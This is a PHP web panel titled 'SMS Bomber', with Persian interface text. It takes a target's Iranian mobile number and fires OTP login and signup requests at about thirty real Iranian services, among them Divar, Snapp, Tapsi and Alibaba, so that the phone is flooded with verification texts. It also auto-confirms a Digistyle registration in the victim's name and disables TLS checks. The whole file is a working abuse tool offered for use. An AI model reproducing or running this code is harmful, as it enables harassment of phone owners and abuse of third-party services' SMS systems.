<?php

set_time_limit(300);

if (isset($_POST['phone'])) {
    if (preg_match("/^([0][9][0-9]{9})$/", $_POST['phone'])) {
        $phone = $_POST['phone'];
        all($phone);
        header("Location:index.php?ok=true");
    } else {
        header("Location:index.php?number=0");
    }
}


function all($phone)
{
    // فراخوانی توابع ارسال برای هر سرویس
    divar($phone);                // سرویس دیوار
    nobatir($phone);              // سرویس نوبت‌ایران
    alopeyk_login($phone);        // سرویس آلوپیک (ورود)
    alopeyk_signup($phone);       // سرویس آلوپیک (ثبت‌نام)
    shahrefarsh($phone);          // سرویس شهرفرش
    digistyle($phone);            // سرویس دیجی‌استایل
    snapp_express($phone);        // سرویس اسنپ اکسپرس
    azki($phone);                 // سرویس ازکی
    digikala_jet($phone);         // سرویس دیجی‌کالا جت
    snapp_drivers($phone);        // سرویس اسنپ درایور
    ostadkar($phone);             // سرویس استادکار
    miare($phone);                // سرویس میاره
    tapsi_drivers($phone);        // سرویس تپسی رانندگان
    tapsi_passenger($phone);      // سرویس تپسی مسافران
    banimode($phone);             // سرویس بانی‌مد
    taaghche_login($phone);       // سرویس طاقچه (ورود)
    taaghche_signup($phone);      // سرویس طاقچه (ثبت‌نام)
    mobit($phone);                // سرویس مبیت
    jabama($phone);               // سرویس جاباما
    ghabzino($phone);             // سرویس قبضینو
    komodaa($phone);              // سرویس کمدا
    barghe_man($phone);           // سرویس برگه من
    vandar($phone);               // سرویس وندار
    pinorest($phone);             // سرویس پینورست
    tetherland($phone);           // سرویس تترلند
    alibaba($phone);              // سرویس علی‌بابا
    drdr($phone);                 // سرویس دکتردکتر
    drnext($phone);               // سرویس درنکست
    classino($phone);             // سرویس کلاسینو
    takshopaccessorise($phone);   // سرویس تک شاپ
}


function generateRandomString($length = 10)
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[random_int(0, $charactersLength - 1)];
    }
    return $randomString;
}


function CURL_SMS($URL, $PHONE_VALUE, $HEADER1 = NULL, $HEADER2 = NULL): void
{
    global $response;
    date_default_timezone_set("Asia/Tehran");
    
    $ch = curl_init();
    
    curl_setopt($ch, CURLOPT_URL, $URL);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    
    if ($HEADER1 != NULL) {
        if ($HEADER2 != NULL) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                $HEADER1, $HEADER2
            ]);
        } else {
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                $HEADER1
            ]);
        }
    }
    
    curl_setopt($ch, CURLOPT_POSTFIELDS, $PHONE_VALUE);
    
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    
    $response = curl_exec($ch);
    
    file_put_contents('log.txt', '[' . date("Y-m-d h:i:sa") . '--URL=' . $URL . ']' . $response . "\n\n", FILE_APPEND);
    
    curl_close($ch);
    
    sleep(2);
}


// سرویس دیوار
function divar($phone)
{
    $url = 'https://api.divar.ir/v5/auth/authenticate';
    $phone_value = '{"phone":"' . $phone . '"}';
    CURL_SMS($url, $phone_value);
}

// سرویس نوبت‌ایران
function nobatir($phone)
{
    $url = 'https://nobat.ir/api/public/patient/login/phone';
    $phone_value = "------WebKitFormBoundary5wscOwxMqnICoiZY\r\nContent-Disposition: form-data; name=\"mobile\"\r\n\r\n" . $phone . "\r\n------WebKitFormBoundary5wscOwxMqnICoiZY--\r\n";
    $header = 'content-type: multipart/form-data; boundary=----WebKitFormBoundary5wscOwxMqnICoiZY';
    CURL_SMS($url, $phone_value, $header);
}

// سرویس آلوپیک (ورود)
function alopeyk_login($phone)
{
    $phone = (int)$phone;  // حذف صفر ابتدای شماره
    $url = 'https://api.alopeyk.com/api/v2/login?platform=pwa';
    $phone_value = '{"type":"CUSTOMER","model":"Chrome 111.0.0.0","platform":"pwa","version":"10","manufacturer":"Windows","isVirtual":false,"serial":true,"app_version":"1.2.9","uuid":true,"phone":" ' . $phone . '"}';
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

// سرویس آلوپیک (ثبت‌نام)
function alopeyk_signup($phone)
{
    $url = 'https://api.alopeyk.com/api/v2/register-customer?platform=pwa';
    $phone_value = "{\"type\":\"CUSTOMER\",\"model\":\"Chrome 111.0.0.0\",\"platform\":\"pwa\",\"version\":\"10\",\"manufacturer\":\"Windows\",\"isVirtual\":false,\"serial\":true,\"app_version\":\"1.2.9\",\"uuid\":true,\"firstname\":\"تست\",\"lastname\":\"تست\",\"phone\":\"" . $phone . "\",\"email\":\"\",\"referred_by\":\"\",\"lat\":null,\"lng\":null}";
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

// سرویس شهرفرش
function shahrefarsh($phone)
{
    $url = 'https://shahrfarsh.com/Account/Login';
    $phone_value = 'phoneNumber=' . $phone;
    CURL_SMS($url, $phone_value);
}

// سرویس دیجی‌استایل
function digistyle($phone)
{
    global $response;
    $url = 'https://www.digistyle.com/users/login-register/';
    $phone_value = 'loginRegister%5Bemail_phone%5D=' . $phone;
    CURL_SMS($url, $phone_value);
    $token = preg_match('/(?<=token=)(.*)(?=&amp)/', $response, $tok);
    file_get_contents('https://www.digistyle.com/users/register/confirm/?token=' . $tok[0] . '&type=register');
}

// سرویس اسنپ اکسپرس
function snapp_express($phone)
{
    $url = 'https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&clientVersion=52f02dbc&optionalVersion=5.6.6&UDID=fb000c1a-41a6-4059-8e22-7fb820e6942b';
    $phone_value = 'cellphone=' . $phone . '&captcha=&optionalLoginToken=true&local=';
    CURL_SMS($url, $phone_value);
}

// سرویس ازکی
function azki($phone)
{
    $url = 'https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/';
    $phone_value = '{"phoneNumber":"' . $phone . '"}';
    $header1 = 'content-type: application/json';
    $header2 = 'deviceid: 6';
    CURL_SMS($url, $phone_value, $header1, $header2);
}

// سرویس دیجی‌کالا جت
function digikala_jet($phone)
{
    $url = 'https://api.digikalajet.ir/user/login-register/';
    $phone_value = '{"phone":"' . $phone . '"}';
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

// سرویس اسنپ درایور
function snapp_drivers($phone)
{
    $url = 'https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone=';
    $phone_value = '{"cellphone":"' . $phone . '"}';
    CURL_SMS($url, $phone_value);
}

// سرویس استادکار
function ostadkar($phone)
{
    $url = 'https://api.ostadkr.com/login';
    $phone_value = '{"mobile":"' . $phone . '"}';
    CURL_SMS($url, $phone_value);
}

// سرویس میاره
function miare($phone)
{
    $url = 'https://www.miare.ir/api/otp/driver/request/';
    $phone_value = '{"phone_number":"' . $phone . '"}';
    $header = 'Content-Type: application/json;charset=UTF-8';
    CURL_SMS($url, $phone_value, $header);
}

// سرویس تپسی رانندگان
function tapsi_drivers($phone)
{
    $url = 'https://api.tapsi.ir/api/v2.2/user';
    $phone_value = '{"credential":{"phoneNumber":"' . $phone . '","role":"DRIVER"},"otpOption":"SMS"}';
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

// سرویس تپسی مسافران
function tapsi_passenger($phone)
{
    $url = 'https://api.tapsi.ir/api/v2.2/user';
    $phone_value = '{"credential":{"phoneNumber":"' . $phone . '","role":"PASSENGER"},"otpOption":"SMS"}';
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

// سرویس بانی‌مد
function banimode($phone)
{
    $url = 'https://mobapi.banimode.com/api/v2/auth/request';
    $phone_value = '{"phone":"' . $phone . '"}';
    $header = 'Content-Type: application/json;charset=UTF-8';
    CURL_SMS($url, $phone_value, $header);
}

// سرویس دکتردکتر
function drdr($phone)
{
    $url = 'https://drdr.ir/api/v3/auth/login/mobile/init';
    $phone_value = '{"mobile":"' . $phone . '"}';
    $header1 = 'content-type: application/json';
    $header2 = 'client-id: f60d5037-b7ac-404a-9e3a-a263fd9f8054';
    CURL_SMS($url, $phone_value, $header1, $header2);
}

// سرویس طاقچه (ورود)
function taaghche_login($phone)
{
    $url = 'https://gw.taaghche.com/v4/site/auth/login';
    $phone_value = '{"contact":"' . $phone . '","forceOtp":false}';
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

// سرویس طاقچه (ثبت‌نام)
function taaghche_signup($phone)
{
    $url = 'https://gw.taaghche.com/v4/site/auth/signup';
    $phone_value = '{"contact":"' . $phone . '"}';
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

// سرویس کمدا
function komodaa($phone)
{
    $url = 'https://api.komodaa.com/api/v2.6/loginRC/request';
    $phone_value = '{"phone_number":"' . $phone . '"}';
    $header = 'Content-Type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

// سرویس قبضینو
function ghabzino($phone)
{
    $url = 'https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode';
    $phone_value = '{"Parameters":{"ApplicationType":"Web","ApplicationUniqueToken":null,"ApplicationVersion":"1.0.0","MobileNumber":"' . $phone . '","UniqueToken":null}}';
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

// سرویس برگه من
function barghe_man($phone)
{
    $url = 'https://uiapi2.saapa.ir/api/otp/sendCode';
    $phone_value = '{"mobile":"' . $phone . '","from_meter_buy":false}';
    CURL_SMS($url, $phone_value);
}

// سرویس وندار
function vandar($phone)
{
    $url = 'https://api.vandar.io/account/v1/check/mobile';
    $phone_value = '{"mobile":"' . $phone . '"}';
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

// سرویس مبیت
function mobit($phone)
{
    $url = 'https://api.mobit.ir/api/web/v8/register/register';
    $phone_value = '{"number":"' . $phone . '"}';
    $header = 'content-type: application/json;charset=UTF-8';
    CURL_SMS($url, $phone_value, $header);
}

// سرویس جاباما
function jabama($phone)
{
    $url = 'https://taraazws.jabama.com/api/v4/account/send-code';
    $phone_value = '{"mobile":"' . $phone . '"}';
    $header = 'Content-Type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

// سرویس پینورست
function pinorest($phone)
{
    $url = 'https://api.pinorest.com/frontend/auth/login/mobile';
    $phone_value = '{"mobile":"' . $phone . '"}';
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

// سرویس تترلند
function tetherland($phone)
{
    $url = 'https://service.tetherland.com/api/v5/login-register';
    $phone_value = '{"mobile":"' . $phone . '"}';
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

// سرویس علی‌بابا
function alibaba($phone)
{
    $url = 'https://ws.alibaba.ir/api/v3/account/mobile/otp';
    $phone_value = '{"phoneNumber":"' . $phone . '"}';
    $header = 'Content-Type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

// سرویس درنکست
function drnext($phone)
{
    $url = 'https://cyclops.drnext.ir/v1/patients/auth/send-verification-token';
    $phone_values = '{"source":"besina","mobile":"' . $phone . '"}';
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_values, $header);
}

// سرویس کلاسینو
function classino($phone)
{
    $url = 'https://student.classino.com/otp/v1/api/login';
    $phone_value = '{"mobile":"' . $phone . '"}';
    $heaedr = 'Content-Type: application/json';
    CURL_SMS($url, $phone_value, $heaedr);
}

// سرویس تک شاپ
function takshopaccessorise($phone)
{
    $url = 'https://takshopaccessorise.ir/api/v1/sessions/login_request';
    $phone_value = '{"mobile_phone":"' . $phone . '"}';
    $header = 'content-type: application/json;charset=UTF-8';
    CURL_SMS($url, $phone_value, $header);
}
?>

<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>💣  SMS Bomber</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;400;500;600;700;800&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Vazirmatn', sans-serif;
        }
        
        body {
            background: linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.6)),
                        url('https://images.unsplash.com/photo-1518837695005-2083093ee35b?ixlib=rb-4.0.3&auto=format&fit=crop&w=1920&q=80');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 500px;
        }
        
        .glass-card {
            background: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            border-radius: 20px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            padding: 40px 30px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2),
                        inset 0 1px 0 rgba(255, 255, 255, 0.2);
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        
        .glass-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
        }
        
        .logo {
            font-size: 4rem;
            color: white;
            margin-bottom: 20px;
            text-shadow: 0 0 30px rgba(255, 255, 255, 0.5);
            filter: drop-shadow(0 5px 15px rgba(0, 0, 0, 0.2));
        }
        
        h1 {
            color: white;
            font-size: 28px;
            margin-bottom: 30px;
            font-weight: 700;
            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
        }
        
        .form-group {
            margin-bottom: 25px;
            text-align: right;
        }
        
        label {
            display: block;
            margin-bottom: 10px;
            color: rgba(255, 255, 255, 0.9);
            font-weight: 500;
            font-size: 16px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        label i {
            font-size: 18px;
        }
        
        input {
            width: 100%;
            padding: 16px 20px;
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-radius: 12px;
            color: white;
            font-size: 16px;
            transition: all 0.3s ease;
            direction: ltr;
            text-align: center;
        }
        
        input::placeholder {
            color: rgba(255, 255, 255, 0.5);
        }
        
        input:focus {
            outline: none;
            border-color: rgba(255, 255, 255, 0.5);
            background: rgba(255, 255, 255, 0.15);
            box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.1);
        }
        
        .btn {
            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
            color: white;
            border: none;
            padding: 18px 40px;
            font-size: 18px;
            font-weight: 600;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-top: 20px;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
            position: relative;
            overflow: hidden;
        }
        
        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: 0.5s;
        }
        
        .btn:hover::before {
            left: 100%;
        }
        
        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
        }
        
        .btn:active {
            transform: translateY(-1px);
        }
        
        .btn i {
            font-size: 20px;
        }
        
        /* استایل پیام‌ها */
        .message {
            padding: 18px;
            border-radius: 12px;
            margin-bottom: 25px;
            text-align: center;
            font-size: 16px;
            line-height: 1.6;
            animation: fadeIn 0.5s ease;
            white-space: pre-line;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            color: white;
            backdrop-filter: blur(10px);
        }
        
        .message.success {
            background: rgba(46, 204, 113, 0.2);
            border-color: rgba(46, 204, 113, 0.3);
        }
        
        .message.error {
            background: rgba(231, 76, 60, 0.2);
            border-color: rgba(231, 76, 60, 0.3);
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        /* پاپ‌آپ */
        .popup {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
            padding: 20px;
            backdrop-filter: blur(5px);
        }
        
        .popup-content {
            background: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
            animation: popupIn 0.3s ease;
            color: white;
        }
        
        @keyframes popupIn {
            from { opacity: 0; transform: scale(0.9) translateY(-20px); }
            to { opacity: 1; transform: scale(1) translateY(0); }
        }
        
        .popup h3 {
            font-size: 24px;
            margin-bottom: 20px;
            color: white;
            font-weight: 600;
        }
        
        .popup p {
            margin-bottom: 30px;
            font-size: 18px;
            line-height: 1.6;
            white-space: pre-line;
        }
        
        .popup-close {
            background: rgba(255, 255, 255, 0.2);
            color: white;
            border: 1px solid rgba(255, 255, 255, 0.3);
            padding: 12px 30px;
            border-radius: 10px;
            cursor: pointer;
            font-size: 16px;
            transition: all 0.3s ease;
            font-weight: 500;
        }
        
        .popup-close:hover {
            background: rgba(255, 255, 255, 0.3);
        }
        
        /* فوتر */
        .footer {
            margin-top: 30px;
            text-align: center;
            color: rgba(255, 255, 255, 0.7);
            font-size: 14px;
            padding-top: 20px;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .footer a {
            color: white;
            text-decoration: none;
            transition: all 0.3s ease;
            font-weight: 500;
        }
        
        .footer a:hover {
            color: #ffcc00;
            text-decoration: underline;
        }
        
        /* SVG Icon */
        .svg-icon {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            display: block;
            filter: drop-shadow(0 5px 15px rgba(0, 0, 0, 0.3));
        }
        
        .counter {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            background: rgba(255, 255, 255, 0.1);
            padding: 8px 20px;
            border-radius: 50px;
            margin-top: 15px;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .counter span {
            font-weight: 600;
            color: white;
        }
        
        @media (max-width: 576px) {
            .glass-card {
                padding: 30px 20px;
            }
            
            h1 {
                font-size: 24px;
            }
            
            .logo {
                font-size: 3.5rem;
            }
            
            .popup-content {
                padding: 30px 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="glass-card">
            <!-- SVG Icon -->
            <svg class="svg-icon" viewBox="0 0 100 100">
                <defs>
                    <linearGradient id="gradient" x1="0%" y1="0%" x2="100%" y2="100%">
                        <stop offset="0%" style="stop-color:#6a11cb;stop-opacity:1" />
                        <stop offset="100%" style="stop-color:#2575fc;stop-opacity:1" />
                    </linearGradient>
                    <filter id="shadow" x="-50%" y="-50%" width="200%" height="200%">
                        <feDropShadow dx="0" dy="5" stdDeviation="5" flood-color="#6a11cb" flood-opacity="0.5"/>
                    </filter>
                </defs>
                <circle cx="50" cy="50" r="40" fill="url(#gradient)" filter="url(#shadow)"/>
                <path d="M35 45 L45 55 L65 40" stroke="white" stroke-width="8" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
                <circle cx="75" cy="30" r="8" fill="#ff4757"/>
            </svg>
            
            <h1>پنل SMS Bomber 💣</h1>
            
            <?php 
            if (isset($_GET['ok']) && $_GET['ok'] == 'true'): ?>
                <div class="message success">
                    ✅ ارسال پیامک‌ها با موفقیت به اتمام رسید
                </div>
            <?php elseif (isset($_GET['number']) && $_GET['number'] == '0'): ?>
                <div class="message error">
                    ❌ فرمت شماره وارد شده اشتباه می باشد
                </div>
            <?php endif; ?>
            
            <form method="POST" id="smsForm">
                <div class="form-group">
                    <label for="phone">
                        <i class="fas fa-mobile-alt"></i> شماره تلفن (با صفر)
                    </label>
                    <input type="text" 
                           id="phone" 
                           name="phone" 
                           placeholder="09XXXXXXXXX" 
                           required
                           pattern="09[0-9]{9}"
                           title="شماره تلفن باید با 09 شروع شده و 11 رقمی باشد">
                </div>
                
                <div class="form-group">
                    <label for="cycles">
                        <i class="fas fa-redo"></i> تعداد دور ارسال
                    </label>
                    <input type="number" 
                           id="cycles" 
                           name="cycles" 
                           value="1"
                           min="1" 
                           max="10" 
                           required>
                </div>
                
                <button type="submit" class="btn" id="submitBtn">
                    <i class="fas fa-paper-plane"></i> ارسال
                </button>
                
                <div class="counter">
                    <i class="fas fa-bolt"></i>
                    <span>github.com/localvps</span>
                </div>
            </form>
            
            <div class="footer">
                <p>© <?php echo date('Y'); ?> - عواقب استفاده نادرست از این پنل به عهده خود کاربر میباشد</p>
            </div>
        </div>
    </div>
    
    <!-- پاپ‌آپ وضعیت -->
    <div class="popup" id="statusPopup">
        <div class="popup-content">
            <h3 id="popupTitle">در حال ارسال</h3>
            <p id="popupMessage">لطفاً منتظر بمانید...</p>
            <button class="popup-close" onclick="closePopup()">متوجه شدم</button>
        </div>
    </div>

    <script>
        const form = document.getElementById('smsForm');
        const submitBtn = document.getElementById('submitBtn');
        const popup = document.getElementById('statusPopup');
        const popupTitle = document.getElementById('popupTitle');
        const popupMessage = document.getElementById('popupMessage');
        
        function validatePhone(phone) {
            return /^09[0-9]{9}$/.test(phone);
        }
        
        function validateCycles(cycles) {
            return cycles >= 1 && cycles <= 10;
        }
        
        function showPopup(title, message) {
            popupTitle.textContent = title;
            popupMessage.textContent = message;
            popup.style.display = 'flex';
            document.body.style.overflow = 'hidden';
        }
        
        function closePopup() {
            popup.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
        
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const phone = document.getElementById('phone').value;
            const cycles = parseInt(document.getElementById('cycles').value);
            
            if (!validatePhone(phone)) {
                showPopup('خطا', '❌ شماره موبایل نامعتبر است!\n\nلطفاً شماره را به صورت زیر وارد کنید:\n09123456789');
                return;
            }
            
            if (!validateCycles(cycles)) {
                showPopup('خطا', '❌ تعداد دور باید بین 1 تا 10 باشد!');
                return;
            }
            
            showPopup(
                '🚀 شروع عملیات',
                '📞 شماره: ' + phone + '\n' +
                '♻️ تعداد دور: ' + cycles + '\n' +
                '⏰ زمان شروع: ' + new Date().toLocaleTimeString('fa-IR') + '\n\n' +
                'لطفاً منتظر بمانید، عملیات ممکن است چند دقیقه طول بکشد...'
            );
            
            const originalText = submitBtn.innerHTML;
            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> در حال ارسال...';
            submitBtn.disabled = true;
            
            const formData = new FormData(form);
            
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(data => {
                const parser = new DOMParser();
                const doc = parser.parseFromString(data, 'text/html');
                const messageDiv = doc.querySelector('.message');
                
                if (messageDiv) {
                    const message = messageDiv.textContent.trim();
                    const isSuccess = messageDiv.className.includes('success');
                    
                    if (isSuccess) {
                        showPopup('✅ موفقیت', message);
                    } else {
                        showPopup('❌ خطا', message);
                    }
                }
            })
            .catch(error => {
                showPopup('❌ خطا', 'خطا در ارتباط با سرور:\n' + error.message);
            })
            .finally(() => {
                submitBtn.innerHTML = originalText;
                submitBtn.disabled = false;
                
                setTimeout(() => {
                    location.reload();
                }, 8000);
            });
        });
        
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                closePopup();
            }
        });
        
        popup.addEventListener('click', function(e) {
            if (e.target === popup) {
                closePopup();
            }
        });
        
        window.addEventListener('load', function() {
            setTimeout(() => {
                showPopup(
                    '👋 به پنل SMS Bomber خوش آمدید',
                );
            }, 1000);
        });
    </script>
</body>
</html>